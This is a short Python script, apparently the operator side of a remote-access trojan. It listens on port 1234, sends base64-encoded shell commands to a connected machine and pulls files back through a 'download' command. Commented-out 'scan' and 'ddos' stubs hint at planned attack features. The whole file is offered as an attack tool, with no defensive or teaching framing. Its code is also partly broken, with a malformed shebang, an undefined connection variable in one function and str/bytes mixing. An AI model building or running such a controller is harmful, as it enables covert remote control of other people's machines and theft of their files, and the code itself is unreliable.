#! usr/bin/env python

#Libs
import socket
import base64
from datetime import datetime
import time

#Conexao
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 1234))
s.listen(10)

#Cryp && Decryp
def encode(strings):
	return base64.b64encode(strings)
def decode(strings):
	return base64.b64decode(strings)

#funcoes
def download():
	while True:
		files = str(input("file:"))
		output = encode(files)
		conn.send(output)
		if '.txt' in files:
			file = open('{}'.format(files), 'w')
			data = conn.recv(1024)
			file.write(data)
			if not data:
				break
			else:
				continue
		else:
			file = open('{}'.format(files), 'wb')
			data = conn.recv(1024)
			file.write(data)
			if not data:
				break
			else:
				continue
#def scan():
#	t1 = datetime.now()
#	target = encode(str(input("IP:")))
#	conn.send(target)
	
#main
def main():
	conn, addr = s.accept()
	while True:
		data = decode(conn.recv(1024))
		print (data)
		comando = str(input("Shell:"))
		if 'download' == comando:
			while True:
				files = str(input("file:"))
				output = encode(files)
				conn.send(output)
				if '.txt' in files:
					file = open('{}'.format(files), 'w')
					data = conn.recv(1024)
					file.write(data)
					if not data:
						break
					else:
						continue
				else:
					file = open('{}'.format(files), 'wb')
					data = conn.recv(1024)
					file.write(data)
					if not data:
						break
					else:
						continue
		#elif 'scan' == comando:
		#	scan()
		#elif 'ddos' == comando:
		#	ddos()

		output = encode(comando)
		conn.send(output)
#Client
def client():
	main()
client()
		